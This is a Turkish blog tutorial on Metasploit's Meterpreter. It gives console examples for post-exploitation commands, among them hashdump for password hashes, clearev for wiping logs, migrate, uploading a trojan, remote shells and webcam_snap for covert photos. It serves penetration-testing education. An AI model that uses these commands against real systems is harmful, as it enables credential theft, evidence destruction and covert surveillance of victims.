---
draft: false

title:  'Metasploit İçinde Meterpreter Komutları'
date: '2017-05-14T12:47:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Bir önceki yazıda, kısaca Meterpreter’in ne olduğunu açıklamıştık. Şimdi de kullanılabilecek komutları detaylarıyla göreceğiz. Burada hemen hemen tüm komutlar açıklanmaya çalışılsa da bir kaç komut, ancak tecrübeyle anlaşılacağından eksik bırakılmıştır. Onları da zamanla açıklığa kavuşturacağız.' 
 
url:  /tr/metasploit-icinde-meterpreter-komutlari/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


Bir önceki yazıda, kısaca Meterpreter’in ne olduğunu açıklamıştık. Şimdi de kullanılabilecek komutları detaylarıyla göreceğiz. Burada hemen hemen tüm komutlar açıklanmaya çalışılsa da bir kaç komut, ancak tecrübeyle anlaşılacağından eksik bırakılmıştır. Onları da zamanla açıklığa kavuşturacağız.



## Meterpreter Komutları



## help



Adından da anlaşılacağı gibi, Meterpreter içinde `help` komutunu verdiğinizde kullanılabilir komutları listeler ve kısa açıklamaları verir.


```bash
meterpreter **>** help

Core Commands
**=============**

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    channel       Displays information about active channels
...snip...
```



## background



`background` komutu, aktif olan Meterpreter oturumunu (session) arka plana gönderir ve sizi tekrar `msf >` komut istemcisine getirir. Arka plandaki Meterpreter oturumuna geçmek için `sessions` komutundan faydalanabilirsiniz.


```bash
meterpreter **>** background
msf exploit**(**ms08_067_netapi**)** **>** sessions -i 1
**[*********]** Starting interaction with 1...

meterpreter **>**
```



## cat



Linux işletim sistemlerinde `cat` komutu, bir dosya içeriğini ekrana yazdırmada kullanılır. Meterpreterde de aynı işe yarar.


```bash
meterpreter **>** cat
Usage: cat file

Example usage:
meterpreter **>** cat edit.txt
What you talkin' about Willis

meterpreter >
```



## cd > pwd



`cd` komutu ile klasör değişimi yapılır. `pwd` komutu ile aktif olarak hangi klasörde olduğumuz görülebilir.


```bash
meterpreter **>** pwd
c:\
meterpreter **>** cd c:\windows
meterpreter **>** pwd
c:\windows
meterpreter **>**
```



## clearev



`clearev` komutu, Clear Evidence yani delilleri temizleme anlamına gelir. Karşı tarafta açılan oturumda oluşturulan **log** dosyalarını temizlemeye çalışır.


```bash
meterpreter **>** clearev
**[*********]** Wiping 97 records from Application...
**[*********]** Wiping 415 records from System...
**[*********]** Wiping 0 records from Security...
meterpreter **>**
```



## download



Karşı bilgisayardan bir dosya indirmeye yarar. İndirilen dosya, metasploit’i başlatırken yerel sisteminizde hangi klasördeyseniz, oraya kaydedilir.


```bash
meterpreter **>** download c:\\boot.ini
**[*********]** downloading: c:\boot.ini -> c:\boot.ini
**[*********]** downloaded : c:\boot.ini -> c:\b<a href="http://oot.ini/boot.ini">oot.ini/boot.ini</a>
meterpreter **>**
```



## edit



`edit` komutu, karşı taraftaki bilgisayarda bulunan bir dosyayı düzenlemek üzere `vim` editörde açar. Vim Editör kullanımı için <a href="http://www.vim.org/">Vim</a> sayfasına bakabilirsiniz.


```bash
meterpreter **>** ls

Listing: C:\Documents and Settings\Administrator\Desktop
**========================================================**

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
.
...snip...
.
100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt

meterpreter **>** edit edit.txt
```



## execute



`execute` komutu, karşı tarafta bir komut çalıştırmanızı sağlar. Dikkat ederseniz, Meterpreter’in kendi komutları çalıştırılmamakta. Karşı tarafın komut istemcisinde bir komut çalıştırılmaktadır.


```bash
meterpreter **>** execute -f cmd.exe -i -H
Process 38320 created.
Channel 1 created.
Microsoft Windows XP **[**Version 5.1.2600]
**(**C**)** Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```



## getuid



Karşı tarafta Meterpreter’in çalıştığı sistemin kullanıcı kimliğini görüntüler.


```bash
meterpreter **>** getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter **>**
```



## hashdump



`hashdump` komutu, karşı taraftaki bilgisayarın SAM veri tabanını ortaya çıkarır. Tabii ki önceki Veri tabanı yazımızda belirttiğimiz gibi Workspace kullanıyorsanız, `loot` tablosuna kayıt eder.


```bash
meterpreter **>** run post/windows/gather/hashdump 

**[*********]** Obtaining the boot key...
**[*********]** Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
**[*********]** Obtaining the user list and keys...
**[*********]** Decrypting user keys...
**[*********]** Dumping password hashes...

Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
meterpreter **>**
```



## idletime



Karşı taraftaki bilgisayar kullanıcısının, ne kadar zamandır işlem yapmadığını gösterir.


```bash
meterpreter **>** idletime
User has been idle **for**: 5 hours 26 mins 35 secs
meterpreter **>**
```



## ipconfig



Karşı bilgisayarın ağ bilgilerini görüntüler.


```bash
meterpreter **>** ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0

AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC: 00:0c:29:10:f5:15
IP Address  : 192.168.1.104
Netmask     : 255.255.0.0

meterpreter **>**
```



## lpwd > lcd



Meterpreter komut satırı açık iken vereceğiniz komutlar karşı taraf bilgisayarda işlem yaparlar. Halbuki biz kendi bilgisayarımızda bulunduğumuz klasörü görmek veya değiştirmek isteyebiliriz. Bu durumda Meterpreter’i geri plana göndermeden `lpwd` ve `lcd` komutlarıyla bu işlemi yapabiliriz. `lpwd`: Yerel bilgisayarda hangi klasörde olduğumuzu gösterir. (local print working directory) `lcd`: Yerel bilgisayarda istediğimiz klasöre geçmeye yarar. (local call directory)


```bash
meterpreter **>** lpwd
/root

meterpreter **>** lcd MSFU
meterpreter **>** lpwd
/root/MSFU

meterpreter **>** lcd /var/www
meterpreter **>** lpwd
/var/www
meterpreter **>**
```



## ls



Linux İşletim sistemindeki `ls` komutuyla aynı işlemi yapar. Bulunulan klasördeki dosya ve klasörleri listeler.


```bash
meterpreter **>** ls

Listing: C:\Documents and Settings\victim
**=========================================**

Mode              Size     Type  Last modified                   Name
----              ----     ----  -------------                   ----
40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
...snip...
```



## migrate



Meterpreter sunucumuz, karşı tarafta svchost.exe dosyasının içinde çalışıyor olabilir. Bunu başka bir programın içine gömülü hale getirmek istediğimizde `migrate` yani “göç et” komutunu kullanırız.


```bash
meterpreter > run post/windows/manage/migrate 

[*] Running module against V-MAC-XP
[*] Current server process: svchost.exe (1076)
[*] Migrating to explorer.exe...
[*] Migrating into process ID 816
[*] New server process: Explorer.EXE (816)
meterpreter >
```



## ps



Hedef bilgisayarda çalışan tüm işlemleri görüntüler.


```bash
meterpreter **>** ps

Process list
**============**

    PID   Name                  Path
    ---   ----                  ----
    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
...snip...
```



## resource



Karşı bilgisayara bağlandığınızda, yaptığınız işlemlerin bir süre sonra aynı şeyler olduğunu fark edersiniz. Örneğin, `ls` komutunu ver, `cd c:\\Program Files` ile programlar klasörüne gir vb. işlemleri hemen her zaman yaparsınız. İşte yerel bilgisayarda bir dosyaya, her satırda bir komut olacak şekilde bu işlemleri kayıt edip karşı tarafta çalıştırabilirsiniz. Bunun gerçekleşmesi için `resource` komutu kullanılmaktadır.



Burada dikkat edilmesi gereken konu, resource komutuna ilk vereceğiniz dosya yerele hangi klasördeyseniz (`lpwd`) orada aranır. İkinci parametre ise karşı tarafta hangi klasörde bulunuyorsanız (pwd) orada çalıştırılır.


```bash
meterpreter **>** resource 
Usage: resource path1 path2Run the commands stored **in **the supplied files.
meterpreter **>**
ARGUMENTS:

path1:		Yerel klasörümüzde bulunan toplu iş dosyamız.
Path2Run:	Komutların çalıştırılacağı karşı klasör

root@kali:~# cat resource.txt
ls
background
root@kali:~#
Running resource command:

meterpreter> **>** resource resource.txt
**[*********]** Reading /root/resource.txt
**[*********]** Running ls

Listing: C:\Documents and Settings\Administrator\Desktop
**========================================================**

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .
40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..
100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk
100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe
100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk

**[*********]** Running background

**[*********]** Backgrounding session 1...
msf  exploit**(**handler**)** **>**
```



## search



Karşı sistemde arama yapmamızı sağlar.


```bash
meterpreter **>** search -f autoexec.bat
Found 1 result...
    c:\AUTOEXEC.BAT
meterpreter **>** search -f sea*****.bat c:\\xamp\\
Found 1 result...
    c:\\xampp\perl\b**in**\search.bat **(**57035 bytes**)**
meterpreter **>**
```



## shell



`shell` komutu, Meterpreter içinde karşı sistemin Command Prompt satırına girmenizi sağlar.


```bash
meterpreter **>** shell
Process 39640 created.
Channel 2 created.
Microsoft Windows XP **[**Version 5.1.2600]
**(**C**)** Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```



## upload



Karşı sisteme bir dosya yüklemenizi sağlar. Hedef sistemin dosya gösterim notasyonu dikkate alınmalıdır. Ters tırnaklara dikkat edilmelidir.


```bash
meterpreter **>** upload evil_trojan.exe c:\\windows\\system32
**[*********]** uploading  : evil_trojan.exe -> c:\windows\system32
**[*********]** uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
meterpreter **>**
```



## webcam_list



Hedef sistemde kullanılabilir durumda olan web kameralarını listeler.


```bash
meterpreter **>** webcam_list
1: Creative WebCam NX Pro
2: Creative WebCam NX Pro **(**VFW**)**
meterpreter **>**
```



## webcam_snap



Hedef sistemin web kamerasından bir adet fotoğraf alır ve yerelde bulunduğunuz klasöre .jpeg formatında kayıt eder.


```bash
meterpreter **>** webcam_snap -i 1 -v false
**[*********]** Starting...
**[**+] Got frame
**[*********]** Stopped
Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
meterpreter **>**
```
